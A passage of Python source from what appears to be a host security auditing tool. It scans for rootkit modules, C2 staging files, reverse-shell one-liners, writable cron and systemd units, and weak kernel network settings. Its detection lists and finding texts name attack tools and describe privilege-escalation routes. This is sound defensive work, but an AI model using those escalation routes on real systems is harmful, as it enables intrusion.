            # type=6 = DEAD_PROCESS (per task spec)
            if ut_type == 6:
                dead_count += 1

        if dead_count >= 5:
            findings.append({
                "severity": "LOW",
                "title": "REPEATED_DEAD_PROCESS",
                "detail": (
                    f"{log_path}: {dead_count} DEAD_PROCESS records — "
                    "possible login-failure burst or crash loop"
                ),
                "host": "localhost",
                "port": 0,
            })

    return findings


def check_loaded_kernel_modules() -> list:
    """Analyse /proc/modules for rootkit indicators and anomalous modules.

    Findings:
        CRITICAL KNOWN_ROOTKIT_MODULE_LOADED      name in known-rootkit list
        HIGH     MODULE_LOADED_FROM_NONSTANDARD_PATH path not under /lib/modules/
        MEDIUM   UNREFERENCED_KERNEL_MODULE        refcount=0 + not whitelisted
    """
    _ROOTKIT_NAMES = {"diamorphine", "reptile", "azazel", "r77", "lkm_hook"}

    _WHITELIST_PREFIXES = (
        "ext4", "xfs", "btrfs", "dm_", "e8c1394",
        "loop", "nf_", "ip_", "xt_", "tcp_",
        "cfg80211", "mac80211", "bluetooth",
        "virtio", "ahci", "nvme",
    )

    import subprocess as _sp

    findings = []

    # Determine canonical modules path
    try:
        uname_r = _sp.check_output(["uname", "-r"], text=True, timeout=3).strip()
        canonical_prefix = f"/lib/modules/{uname_r}"
    except Exception:
        canonical_prefix = "/lib/modules/"

    try:
        with open("/proc/modules") as fh:
            lines = fh.readlines()
    except (PermissionError, FileNotFoundError):
        return findings

    for line in lines:
        parts = line.split()
        if len(parts) < 4:
            continue

        name = parts[0].lower()
        try:
            refcount = int(parts[2])
        except ValueError:
            refcount = -1
        # parts[3] = "-" (no deps) or comma-separated list

        # Try to get module file path from modinfo
        mod_path = None
        try:
            out = _sp.check_output(
                ["modinfo", "-F", "filename", name],
                text=True, timeout=3, stderr=_sp.DEVNULL
            ).strip()
            if out:
                mod_path = out
        except Exception:
            pass

        # CRITICAL: known rootkit name
        if name in _ROOTKIT_NAMES:
            findings.append({
                "severity": "CRITICAL",
                "title": "KNOWN_ROOTKIT_MODULE_LOADED",
                "detail": (
                    f"Kernel module '{name}' matches known rootkit list "
                    f"(diamorphine / reptile / azazel / r77 / lkm_hook)"
                ),
                "host": "localhost",
                "port": 0,
            })
            continue  # no need for further checks on this module

        # HIGH: loaded from non-standard path
        if mod_path and not mod_path.startswith(canonical_prefix):
            findings.append({
                "severity": "HIGH",
                "title": "MODULE_LOADED_FROM_NONSTANDARD_PATH",
                "detail": (
                    f"Module '{name}' loaded from '{mod_path}' "
                    f"(expected prefix: {canonical_prefix})"
                ),
                "host": "localhost",
                "port": 0,
            })

        # MEDIUM: zero references + not in whitelist
        if refcount == 0:
            whitelisted = any(
                name.startswith(pfx) for pfx in _WHITELIST_PREFIXES
            )
            if not whitelisted:
                findings.append({
                    "severity": "MEDIUM",
                    "title": "UNREFERENCED_KERNEL_MODULE",
                    "detail": (
                        f"Module '{name}' has refcount=0 and is not in "
                        "common whitelist — possible stealth load"
                    ),
                    "host": "localhost",
                    "port": 0,
                })

    return findings


def check_network_namespace_escape() -> list:
    """Detect network namespace exposure indicating container escape risk.

    Findings:
        HIGH   RUNNING_IN_HOST_NETWORK_NS    /proc/self/net/dev == /proc/1/net/dev
        MEDIUM HOST_INTERFACE_VISIBLE        eth0/ens* present in /proc/self/net/if_inet6
        INFO   NS_COMPARISON                 namespace inode comparison result
    """
    findings = []

    def _read_dev_interfaces(path: str) -> set:
        try:
            with open(path) as fh:
                lines = fh.readlines()
            ifaces = set()
            for line in lines[2:]:  # skip two header lines
                iface = line.split(":")[0].strip()
                if iface:
                    ifaces.add(iface)
            return ifaces
        except (PermissionError, FileNotFoundError):
            return set()

    host_ifaces = _read_dev_interfaces("/proc/1/net/dev")
    self_ifaces = _read_dev_interfaces("/proc/self/net/dev")

    if host_ifaces and self_ifaces and host_ifaces == self_ifaces:
        findings.append({
            "severity": "HIGH",
            "title": "RUNNING_IN_HOST_NETWORK_NS",
            "detail": (
                "/proc/self/net/dev and /proc/1/net/dev share identical "
                f"interfaces ({sorted(self_ifaces)}) — process is in the "
                "host network namespace (no network isolation)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # Check if_inet6 for host-like interface names
    try:
        with open("/proc/self/net/if_inet6") as fh:
            content = fh.read()
        host_iface_pattern = re.compile(r'\b(eth\d+|ens\d+|enp\d+s\d+)\b')
        matches = host_iface_pattern.findall(content)
        if matches:
            findings.append({
                "severity": "MEDIUM",
                "title": "HOST_INTERFACE_VISIBLE",
                "detail": (
                    f"Host-like interface(s) {list(set(matches))} visible in "
                    "/proc/self/net/if_inet6 — container may share host net NS"
                ),
                "host": "localhost",
                "port": 0,
            })
    except (PermissionError, FileNotFoundError):
        pass

    # Namespace inode comparison (INFO)
    def _ns_inode(pid: str, ns: str) -> int:
        try:
            target = os.readlink(f"/proc/{pid}/ns/{ns}")
            m = re.search(r'\[(\d+)\]', target)
            return int(m.group(1)) if m else -1
        except Exception:
            return -1

    for ns in ("net", "pid", "mnt"):
        init_ino = _ns_inode("1", ns)
        self_ino = _ns_inode("self", ns)
        if init_ino != -1 and self_ino != -1:
            same = init_ino == self_ino
            findings.append({
                "severity": "INFO",
                "title": "NS_COMPARISON",
                "detail": (
                    f"Namespace '{ns}': init_inode={init_ino} "
                    f"self_inode={self_ino} same={same}"
                ),
                "host": "localhost",
                "port": 0,
            })

    return findings


def check_ipc_namespace_exposure() -> list:
    """Check /proc/sysvipc for world-accessible shared memory, message queues, semaphores.

    /proc/sysvipc/shm columns: key shmid perms size cpid lpid nattch uid gid ...
    /proc/sysvipc/msg columns: key msqid perms cbytes qnum lspid lrpid uid gid ...
    /proc/sysvipc/sem columns: key semid perms nsems uid gid ...

    Findings:
        MEDIUM WORLD_READABLE_SHM_SEGMENT   shm key=0 or world-readable perms
        MEDIUM WORLD_READABLE_MSG_QUEUE     msg queue world-readable
        INFO   SEMAPHORE_ARRAY_PRESENT      semaphore arrays enumerated
    """
    findings = []

    # --- Shared Memory ---
    try:
        with open("/proc/sysvipc/shm") as fh:
            lines = fh.readlines()
        for line in lines[1:]:  # skip header
            parts = line.split()
            if len(parts) < 4:
                continue
            try:
                key = int(parts[0])
                perms = int(parts[2], 8) if parts[2].isdigit() else int(parts[2])
                size = int(parts[3])
            except ValueError:
                continue
            world_readable = bool(perms & 0o004)
            if key == 0 or world_readable:
                findings.append({
                    "severity": "MEDIUM",
                    "title": "WORLD_READABLE_SHM_SEGMENT",
                    "detail": (
                        f"Shared memory segment key={key} perms={oct(perms)} "
                        f"size={size} — world-readable or null-key segment"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
    except (PermissionError, FileNotFoundError):
        pass

    # --- Message Queues ---
    try:
        with open("/proc/sysvipc/msg") as fh:
            lines = fh.readlines()
        for line in lines[1:]:
            parts = line.split()
            if len(parts) < 3:
                continue
            try:
                key = int(parts[0])
                perms = int(parts[2], 8) if parts[2].isdigit() else int(parts[2])
            except ValueError:
                continue
            world_readable = bool(perms & 0o004)
            if world_readable:
                findings.append({
                    "severity": "MEDIUM",
                    "title": "WORLD_READABLE_MSG_QUEUE",
                    "detail": (
                        f"Message queue key={key} perms={oct(perms)} — "
                        "world-readable; may expose inter-process communication data"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
    except (PermissionError, FileNotFoundError):
        pass

    # --- Semaphore Arrays ---
    try:
        with open("/proc/sysvipc/sem") as fh:
            lines = fh.readlines()
        sem_count = max(0, len(lines) - 1)  # subtract header
        if sem_count > 0:
            findings.append({
                "severity": "INFO",
                "title": "SEMAPHORE_ARRAY_PRESENT",
                "detail": (
                    f"{sem_count} semaphore array(s) in /proc/sysvipc/sem — "
                    "enumerate with ipcs -s for IPC surface mapping"
                ),
                "host": "localhost",
                "port": 0,
            })
    except (PermissionError, FileNotFoundError):
        pass

    return findings


def check_adversary_tool_indicators() -> list:
    """Scan for Empire / Metasploit / Cobalt Strike staging artifacts.

    Checks:
        CRITICAL SHARED_MEM_LIBRARY_INJECTION   /dev/shm/*.so
        HIGH     POSSIBLE_C2_STAGING_FILE        /tmp/*.elf, meterpreter*, .beacon_*, empire*, agent.*
        HIGH     SCRIPTING_SHELL_SOCKET_CALL     python3 -c / perl -e / ruby -e with 'socket' in cmdline
        HIGH     DELETED_PROCESS_BINARY          /proc/{pid}/exe points to deleted binary
        MEDIUM   XVFB_OR_X_LOCK_IN_TMP          /tmp/.X[0-9]-lock

    Returns list of finding dicts.
    """
    import glob as _glob

    findings = []

    # --- CRITICAL: /dev/shm/*.so ---
    try:
        so_files = _glob.glob("/dev/shm/*.so") + _glob.glob("/dev/shm/*.so.*")
        for f in so_files:
            findings.append({
                "severity": "CRITICAL",
                "title": "SHARED_MEM_LIBRARY_INJECTION",
                "detail": (
                    f"Shared library '{f}' found in /dev/shm — "
                    "indicative of in-memory library injection / reflective loading"
                ),
                "host": "localhost",
                "port": 0,
            })
    except Exception:
        pass

    # --- HIGH: C2 staging files in /tmp ---
    _STAGE_PATTERNS = [
        "/tmp/*.elf",
        "/tmp/meterpreter*",
        "/tmp/.beacon_*",
        "/tmp/empire*",
        "/tmp/agent.*",
    ]
    seen_staging = set()
    for pattern in _STAGE_PATTERNS:
        try:
            for f in _glob.glob(pattern):
                if f not in seen_staging:
                    seen_staging.add(f)
                    findings.append({
                        "severity": "HIGH",
                        "title": "POSSIBLE_C2_STAGING_FILE",
                        "detail": (
                            f"Possible C2/stager artifact at '{f}' "
                            f"(matched pattern {pattern})"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
        except Exception:
            pass

    # --- MEDIUM: X lock files ---
    try:
        for f in _glob.glob("/tmp/.X[0-9]-lock") + _glob.glob("/tmp/.X[0-9][0-9]-lock"):
            findings.append({
                "severity": "MEDIUM",
                "title": "XVFB_OR_X_LOCK_IN_TMP",
                "detail": (
                    f"X lock file '{f}' in /tmp — "
                    "may indicate headless Xvfb used by C2 frameworks for screenshot/keylog"
                ),
                "host": "localhost",
                "port": 0,
            })
    except Exception:
        pass

    # --- HIGH: scripting shells with socket calls + deleted process binaries ---
    _SCRIPT_INTERPS = {"python3", "python", "perl", "ruby"}

    try:
        pids = [d for d in os.listdir("/proc") if d.isdigit()]
    except Exception:
        pids = []

    for pid in pids:
        # Deleted executable
        exe_path = f"/proc/{pid}/exe"
        try:
            target = os.readlink(exe_path)
            if "(deleted)" in target:
                findings.append({
                    "severity": "HIGH",
                    "title": "DELETED_PROCESS_BINARY",
                    "detail": (
                        f"PID {pid} exe points to deleted binary: '{target}' — "
                        "common indicator of in-memory malware or updated stager"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
        except (PermissionError, FileNotFoundError, OSError):
            pass

        # Scripting shell with socket in cmdline
        cmdline_path = f"/proc/{pid}/cmdline"
        try:
            with open(cmdline_path, "rb") as fh:
                raw = fh.read(4096)
            cmdline = raw.replace(b"\x00", b" ").decode("utf-8", errors="replace").strip()
            if not cmdline:
                continue
            parts = cmdline.split()
            if not parts:
                continue
            interp = os.path.basename(parts[0]).lower()
            # strip version suffix: python3.9 -> python3
            interp_base = re.sub(r'[\d.]+$', '', interp)
            is_script_exec = (
                (interp in _SCRIPT_INTERPS or interp_base in _SCRIPT_INTERPS)
                and any(flag in parts for flag in ("-c", "-e"))
            )
            if is_script_exec and "socket" in cmdline.lower():
                findings.append({
                    "severity": "HIGH",
                    "title": "SCRIPTING_SHELL_SOCKET_CALL",
                    "detail": (
                        f"PID {pid} running '{cmdline[:200]}' — "
                        "one-liner interpreter with socket call: possible reverse shell"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
        except (PermissionError, FileNotFoundError):
            pass
        except Exception:
            pass

    return findings


def check_windows_unquoted_service_paths(base_path="/") -> list:
    """Unquoted service path detection via .reg exports, .ini/.conf files, and .bat/.cmd scripts."""
    import re as _re
    findings = []

    # --- Wine registry: /proc/registry or wine prefix .reg files ---
    # Pattern: ImagePath value containing a space-bearing path not wrapped in quotes
    _unquoted_re = _re.compile(
        r'"ImagePath"\s*=\s*"([^"]*\s[^"]*\.exe[^"]*)"',
        _re.IGNORECASE,
    )
    # Also catch REG_EXPAND_SZ form: ImagePath=REG_EXPAND_SZ:C:\Program Files\...
    _unquoted_re2 = _re.compile(
        r'ImagePath\s*=\s*REG_EXPAND_SZ:["\s]?([^\r\n"]*\s[^\r\n"]*\.exe)',
        _re.IGNORECASE,
    )

    reg_files = []
    try:
        for root, dirs, files in os.walk(base_path):
            # Skip obviously irrelevant mount points
            for fname in files:
                if fname.lower().endswith(".reg"):
                    reg_files.append(os.path.join(root, fname))
            # Limit depth for performance — 8 levels is deep enough for wine prefixes
            depth = root[len(base_path):].count(os.sep)
            if depth >= 8:
                dirs.clear()
    except (PermissionError, OSError):
        pass

    for reg_path in reg_files:
        try:
            with open(reg_path, "r", encoding="utf-8", errors="replace") as fh:
                content = fh.read(65536)  # 64 KB cap
            # Check for ImagePath without surrounding outer quotes
            for m in _unquoted_re.finditer(content):
                path_val = m.group(1)
                # Only flag if the executable component itself is unquoted (contains space before .exe)
                exe_part = path_val.split(".exe")[0] + ".exe"
                if " " in exe_part.strip('"'):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "WINDOWS_UNQUOTED_SERVICE_PATH",
                        "detail": (
                            f"ImagePath '{path_val}' in {reg_path} — "
                            "service binary path contains spaces and is not fully quoted; "
                            "Windows SCM resolves ambiguously, enabling path-planting escalation"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
            for m in _unquoted_re2.finditer(content):
                path_val = m.group(1).strip()
                if " " in path_val:
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "WINDOWS_UNQUOTED_SERVICE_PATH",
                        "detail": (
                            f"REG_EXPAND_SZ ImagePath '{path_val}' in {reg_path} — "
                            "unquoted service path with spaces; path-planting vector"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
        except (PermissionError, OSError):
            pass

    # --- .ini / .conf files containing Windows-style paths ---
    _win_path_re = _re.compile(
        r'[Cc]:\\\\Program Files',
        _re.IGNORECASE,
    )
    conf_extensions = {".ini", ".conf", ".cfg"}
    try:
        for root, dirs, files in os.walk(base_path):
            for fname in files:
                if any(fname.lower().endswith(ext) for ext in conf_extensions):
                    fpath = os.path.join(root, fname)
                    try:
                        with open(fpath, "r", encoding="utf-8", errors="replace") as fh:
                            snippet = fh.read(16384)
                        if _win_path_re.search(snippet):
                            findings.append({
                                "severity": "MEDIUM",
                                "title": "WINDOWS_STYLE_PATHS_IN_CONFIGS",
                                "detail": (
                                    f"Windows-style 'C:\\Program Files' path found in {fpath} — "
                                    "may indicate Wine/CrossOver service config; review for unquoted path risk"
                                ),
                                "host": "localhost",
                                "port": 0,
                            })
                    except (PermissionError, OSError):
                        pass
            depth = root[len(base_path):].count(os.sep)
            if depth >= 6:
                dirs.clear()
    except (PermissionError, OSError):
        pass

    # --- .bat / .cmd scripts with unquoted space-bearing executable calls ---
    _bat_exec_re = _re.compile(
        r'^\s*(?:start\s+)?([A-Za-z]:\\[^\s"]+\s[^\s"]+\.(?:exe|com|bat|cmd))',
        _re.IGNORECASE | _re.MULTILINE,
    )
    script_extensions = {".bat", ".cmd"}
    try:
        for root, dirs, files in os.walk(base_path):
            for fname in files:
                if any(fname.lower().endswith(ext) for ext in script_extensions):
                    fpath = os.path.join(root, fname)
                    try:
                        with open(fpath, "r", encoding="utf-8", errors="replace") as fh:
                            content = fh.read(32768)
                        for m in _bat_exec_re.finditer(content):
                            findings.append({
                                "severity": "HIGH",
                                "title": "UNQUOTED_PATH_IN_BATCH_SCRIPT",
                                "detail": (
                                    f"Unquoted executable path '{m.group(1).strip()}' "
                                    f"in batch script {fpath} — "
                                    "path with spaces not quoted; Windows resolves left-to-right, "
                                    "enabling executable substitution if earlier path component is writable"
                                ),
                                "host": "localhost",
                                "port": 0,
                            })
                    except (PermissionError, OSError):
                        pass
            depth = root[len(base_path):].count(os.sep)
            if depth >= 6:
                dirs.clear()
    except (PermissionError, OSError):
        pass

    return findings


def check_alwaysinstallelevated() -> list:
    """AlwaysInstallElevated MSI elevation detection via registry exports and filesystem."""
    findings = []

    # --- Wine/registry .reg files: check AlwaysInstallElevated = dword:00000001 ---
    import re as _re
    _aie_re = _re.compile(
        r'"AlwaysInstallElevated"\s*=\s*dword:0*1',
        _re.IGNORECASE,
    )
    _installer_key_re = _re.compile(
        r'\[HKEY_(?:LOCAL_MACHINE|CURRENT_USER)\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\]',
        _re.IGNORECASE,
    )

    try:
        for root, dirs, files in os.walk("/"):
            for fname in files:
                if not fname.lower().endswith(".reg"):
                    continue
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="replace") as fh:
                        content = fh.read(65536)
                    if _installer_key_re.search(content) and _aie_re.search(content):
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "ALWAYSINSTALLELEVATED_ENABLED",
                            "detail": (
                                f"AlwaysInstallElevated=1 found in {fpath} — "
                                "MSI packages execute as SYSTEM regardless of user privilege; "
                                "drop a crafted .msi to escalate to SYSTEM"
                            ),
                            "host": "localhost",
                            "port": 0,
                        })
                except (PermissionError, OSError):
                    pass
            depth = root.count(os.sep)
            if depth >= 8:
                dirs.clear()
    except (PermissionError, OSError):
        pass

    # --- World-writable .msi files ---
    try:
        for root, dirs, files in os.walk("/"):
            for fname in files:
                if not fname.lower().endswith(".msi"):
                    continue
                fpath = os.path.join(root, fname)
                try:
                    st = os.stat(fpath)
                    if st.st_mode & 0o002:
                        findings.append({
                            "severity": "HIGH",
                            "title": "WORLD_WRITABLE_MSI",
                            "detail": (
                                f"MSI installer '{fpath}' is world-writable (mode {oct(st.st_mode)}) — "
                                "attacker can replace MSI payload; combined with AlwaysInstallElevated "
                                "yields SYSTEM code execution"
                            ),
                            "host": "localhost",
                            "port": 0,
                        })
                except (PermissionError, OSError):
                    pass
            depth = root.count(os.sep)
            if depth >= 8:
                dirs.clear()
    except (PermissionError, OSError):
        pass

    # --- World-writable MSI temp extraction paths ---
    msi_tmp_dirs = ["/tmp", "/var/tmp"]
    import re as _re2
    _msi_tmp_re = _re2.compile(r'^(msi|\.tmp|tmp[0-9a-f]+)', _re2.IGNORECASE)
    for base in msi_tmp_dirs:
        try:
            for entry in os.listdir(base):
                if not _msi_tmp_re.match(entry):
                    continue
                fpath = os.path.join(base, entry)
                try:
                    st = os.stat(fpath)
                    if st.st_mode & 0o002:
                        findings.append({
                            "severity": "MEDIUM",
                            "title": "MSI_TEMP_PATH_WRITABLE",
                            "detail": (
                                f"MSI temp path '{fpath}' is world-writable (mode {oct(st.st_mode)}) — "
                                "DLL/binary planted here may be loaded by MSI extraction under elevated context"
                            ),
                            "host": "localhost",
                            "port": 0,
                        })
                except (PermissionError, OSError):
                    pass
        except (PermissionError, OSError):
            pass

    return findings


def check_token_impersonation_surface() -> list:
    """Linux capability and UID anomaly checks analogous to Windows token impersonation surface."""
    findings = []

    try:
        pids = [d for d in os.listdir("/proc") if d.isdigit()]
    except (PermissionError, OSError):
        pids = []

    for pid in pids:
        status_path = f"/proc/{pid}/status"
        try:
            with open(status_path, "r") as fh:
                status_text = fh.read(4096)
        except (PermissionError, FileNotFoundError, OSError):
            continue

        # Parse UID line: Uid: real effective saved fs
        uid_line = next(
            (l for l in status_text.splitlines() if l.startswith("Uid:")), None
        )
        cap_eff_line = next(
            (l for l in status_text.splitlines() if l.startswith("CapEff:")), None
        )
        cap_amb_line = next(
            (l for l in status_text.splitlines() if l.startswith("CapAmb:")), None
        )

        # Parse effective caps
        cap_eff = 0
        if cap_eff_line:
            try:
                cap_eff = int(cap_eff_line.split(":")[1].strip(), 16)
            except (ValueError, IndexError):
                pass

        # Parse ambient caps
        cap_amb = 0
        if cap_amb_line:
            try:
                cap_amb = int(cap_amb_line.split(":")[1].strip(), 16)
            except (ValueError, IndexError):
                pass

        # Parse UIDs
        uid_real = uid_eff = uid_saved = uid_fs = None
        if uid_line:
            try:
                parts = uid_line.split(":")[1].split()
                uid_real = int(parts[0])
                uid_eff = int(parts[1])
                uid_saved = int(parts[2]) if len(parts) > 2 else None
                uid_fs = int(parts[3]) if len(parts) > 3 else None
            except (ValueError, IndexError):
                pass

        # CAP_SYS_ADMIN = bit 21 (0x200000)
        _CAP_SYS_ADMIN = (1 << 21)
        if cap_eff & _CAP_SYS_ADMIN:
            findings.append({
                "severity": "CRITICAL",
                "title": "CAP_SYS_ADMIN_EFFECTIVE",
                "detail": (
                    f"PID {pid} has CAP_SYS_ADMIN in effective capability set (CapEff={hex(cap_eff)}) — "
                    "broadest Linux capability; enables namespace escape, overlay FS abuse, "
                    "device access, and container breakout"
                ),
                "host": "localhost",
                "port": 0,
            })

        # Setuid cap (bit 6) or setgid cap (bit 7) on non-root process
        _CAP_SETUID = (1 << 7)
        _CAP_SETGID = (1 << 6)
        if uid_real is not None and uid_real != 0:
            if cap_eff & _CAP_SETUID:
                findings.append({
                    "severity": "HIGH",
                    "title": "SETUID_SETGID_CAP_NON_ROOT",
                    "detail": (
                        f"PID {pid} (UID={uid_real}) has CAP_SETUID in effective caps (CapEff={hex(cap_eff)}) — "
                        "non-root process can change UID to 0; direct privilege escalation primitive"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
            elif cap_eff & _CAP_SETGID:
                findings.append({
                    "severity": "HIGH",
                    "title": "SETUID_SETGID_CAP_NON_ROOT",
                    "detail": (
                        f"PID {pid} (UID={uid_real}) has CAP_SETGID in effective caps (CapEff={hex(cap_eff)}) — "
                        "non-root process can change GID arbitrarily"
                    ),
                    "host": "localhost",
                    "port": 0,
                })

        # Ambient capabilities non-zero
        if cap_amb != 0:
            findings.append({
                "severity": "HIGH",
                "title": "AMBIENT_CAPABILITIES_SET",
                "detail": (
                    f"PID {pid} has non-zero ambient capability set (CapAmb={hex(cap_amb)}) — "
                    "capabilities inherited across execve without setuid bit; "
                    "child processes launched from this PID inherit elevated caps"
                ),
                "host": "localhost",
                "port": 0,
            })

        # Process running as UID 0 effective but started by non-root (fs uid != 0)
        if (
            uid_eff == 0
            and uid_real is not None
            and uid_real != 0
        ):
            findings.append({
                "severity": "CRITICAL",
                "title": "PRIVESC_SETUID_PROCESS",
                "detail": (
                    f"PID {pid} has effective UID 0 but real UID {uid_real} — "
                    "setuid escalation active: process running as root on behalf of unprivileged user; "
                    "exploitable if the process has an attack surface (IPC, socket, signal handling)"
                ),
                "host": "localhost",
                "port": 0,
            })

    return findings


def check_scheduled_task_abuse() -> list:
    """Scheduled task / cron / systemd timer abuse detection for privilege escalation."""
    import stat as _stat
    findings = []

    try:
        current_uid = os.getuid()
    except AttributeError:
        current_uid = -1

    # --- /etc/cron.d/ writable by non-root ---
    cron_d = "/etc/cron.d"
    try:
        if os.path.isdir(cron_d):
            st = os.stat(cron_d)
            # World-writable or group-writable with non-root GID
            if st.st_mode & 0o002:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "CRON_D_WRITABLE",
                    "detail": (
                        f"'/etc/cron.d' directory is world-writable (mode {oct(st.st_mode)}) — "
                        "any user can drop a cron file to execute arbitrary commands as root"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
            # Check individual files in /etc/cron.d
            for entry in os.listdir(cron_d):
                fpath = os.path.join(cron_d, entry)
                try:
                    fst = os.stat(fpath)
                    if fst.st_mode & 0o002:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "CRON_D_WRITABLE",
                            "detail": (
                                f"Cron file '{fpath}' is world-writable (mode {oct(fst.st_mode)}) — "
                                "attacker can modify scheduled root task to inject arbitrary commands"
                            ),
                            "host": "localhost",
                            "port": 0,
                        })
                except (PermissionError, OSError):
                    pass
    except (PermissionError, OSError):
        pass

    # --- /etc/anacrontab writable ---
    anacrontab = "/etc/anacrontab"
    try:
        if os.path.exists(anacrontab):
            st = os.stat(anacrontab)
            if st.st_mode & 0o002:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "ANACRONTAB_WRITABLE",
                    "detail": (
                        f"'/etc/anacrontab' is world-writable (mode {oct(st.st_mode)}) — "
                        "anacron jobs run as root; modify to execute arbitrary commands at next run"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
    except (PermissionError, OSError):
        pass

    # --- /var/spool/cron/crontabs/ readable by current user ---
    crontabs_dir = "/var/spool/cron/crontabs"
    try:
        if os.path.isdir(crontabs_dir):
            entries = os.listdir(crontabs_dir)
            if entries:
                findings.append({
                    "severity": "HIGH",
                    "title": "USER_CRONTABS_READABLE",
                    "detail": (
                        f"'/var/spool/cron/crontabs/' is readable (UID={current_uid}) and contains "
                        f"{len(entries)} crontab(s): {', '.join(entries[:10])} — "
                        "user crontab contents may reveal scheduled scripts or writable paths for hijacking"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
    except (PermissionError, OSError):
        pass

    # --- SUID bit on scripts in /etc/cron* directories ---
    cron_dirs = [
        "/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly",
        "/etc/cron.monthly", "/etc/cron.d",
    ]
    for cdir in cron_dirs:
        try:
            if not os.path.isdir(cdir):
                continue
            for entry in os.listdir(cdir):
                fpath = os.path.join(cdir, entry)
                try:
                    st = os.stat(fpath)
                    if st.st_mode & _stat.S_ISUID:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "SUID_CRON_SCRIPT",
                            "detail": (
                                f"SUID bit set on cron script '{fpath}' (mode {oct(st.st_mode)}) — "
                                "script runs as file owner (likely root) regardless of invoking user; "
                                "if script or its dependencies are writable, direct escalation path"
                            ),
                            "host": "localhost",
                            "port": 0,
                        })
                except (PermissionError, OSError):
                    pass
        except (PermissionError, OSError):
            pass

    # --- systemd .timer files world-writable ---
    timer_dirs = [
        "/etc/systemd/system",
        "/usr/lib/systemd/system",
        "/lib/systemd/system",
        "/run/systemd/system",
    ]
    for tdir in timer_dirs:
        try:
            if not os.path.isdir(tdir):
                continue
            for entry in os.listdir(tdir):
                fpath = os.path.join(tdir, entry)
                if not entry.endswith(".timer"):
                    continue
                try:
                    st = os.stat(fpath)
                    if st.st_mode & 0o002:
                        findings.append({
                            "severity": "HIGH",
                            "title": "SYSTEMD_TIMER_WRITABLE",
                            "detail": (
                                f"systemd timer unit '{fpath}' is world-writable (mode {oct(st.st_mode)}) — "
                                "attacker can redirect timer to a malicious .service unit "
                                "to execute arbitrary commands at the scheduled interval"
                            ),
                            "host": "localhost",
                            "port": 0,
                        })
                except (PermissionError, OSError):
                    pass
        except (PermissionError, OSError):
            pass

    # --- /etc/systemd/system/*.service files writable ---
    svc_dir = "/etc/systemd/system"
    try:
        if os.path.isdir(svc_dir):
            for entry in os.listdir(svc_dir):
                fpath = os.path.join(svc_dir, entry)
                if not entry.endswith(".service"):
                    continue
                try:
                    st = os.stat(fpath)
                    if st.st_mode & 0o002:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "SYSTEMD_SERVICE_WRITABLE",
                            "detail": (
                                f"systemd service unit '{fpath}' is world-writable (mode {oct(st.st_mode)}) — "
                                "modify ExecStart= to execute arbitrary commands as the service user "
                                "(often root); reload and restart to trigger"
                            ),
                            "host": "localhost",
                            "port": 0,
                        })
                except (PermissionError, OSError):
                    pass
    except (PermissionError, OSError):
        pass

    return findings


def check_kernel_network_parameters() -> list:
    """Linux kernel network hardening parameter audit via /proc/sys/net."""
    findings = []

    def _read_proc(path):
        try:
            with open(path, "r") as fh:
                return fh.read().strip()
        except (PermissionError, FileNotFoundError, OSError):
            return None

    # IP forwarding — host acting as router
    val = _read_proc("/proc/sys/net/ipv4/ip_forward")
    if val == "1":
        findings.append({
            "severity": "HIGH",
            "title": "IP_FORWARDING_ENABLED",
            "detail": (
                "/proc/sys/net/ipv4/ip_forward=1 — host is configured as an IP router; "
                "unexpected on non-gateway hosts; enables traffic interception and "
                "man-in-the-middle between network segments"
            ),
            "host": "localhost",
            "port": 0,
        })

    # Source routing — LSRR/SSRR
    val = _read_proc("/proc/sys/net/ipv4/conf/all/accept_source_route")
    if val == "1":
        findings.append({
            "severity": "HIGH",
            "title": "SOURCE_ROUTING_ENABLED",
            "detail": (
                "/proc/sys/net/ipv4/conf/all/accept_source_route=1 — "
                "host accepts IP packets with source-route options (LSRR/SSRR); "
                "allows attacker to specify packet path, bypassing egress controls "
                "and enabling spoofed-source traffic"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ICMP redirects — routing table poisoning
    val = _read_proc("/proc/sys/net/ipv4/conf/all/accept_redirects")
    if val == "1":
        findings.append({
            "severity": "HIGH",
            "title": "ICMP_REDIRECTS_ENABLED",
            "detail": (
                "/proc/sys/net/ipv4/conf/all/accept_redirects=1 — "
                "host accepts ICMP redirect messages that modify its routing table; "
                "attacker on the local segment can redirect traffic through a "
                "controlled gateway for interception or denial of service"
            ),
            "host": "localhost",
            "port": 0,
        })

    # Reverse path filtering — IP spoofing
    val = _read_proc("/proc/sys/net/ipv4/conf/all/rp_filter")
    if val == "0":
        findings.append({
            "severity": "MEDIUM",
            "title": "REVERSE_PATH_FILTER_DISABLED",
            "detail": (
                "/proc/sys/net/ipv4/conf/all/rp_filter=0 — "
                "reverse path filtering is disabled; kernel will accept packets "
                "whose source address has no return route through the receiving "
                "interface, enabling IP spoofing attacks"
            ),
            "host": "localhost",
            "port": 0,
        })

    # SYN cookies — SYN flood protection
    val = _read_proc("/proc/sys/net/ipv4/tcp_syncookies")
    if val == "0":
        findings.append({
            "severity": "HIGH",
            "title": "SYN_COOKIES_DISABLED",
            "detail": (
                "/proc/sys/net/ipv4/tcp_syncookies=0 — "
                "TCP SYN cookies are disabled; host is vulnerable to SYN flood "
                "denial-of-service attacks that exhaust the connection backlog "
                "and prevent legitimate connections"
            ),
            "host": "localhost",
            "port": 0,
        })

    # Broadcast ping — amplification
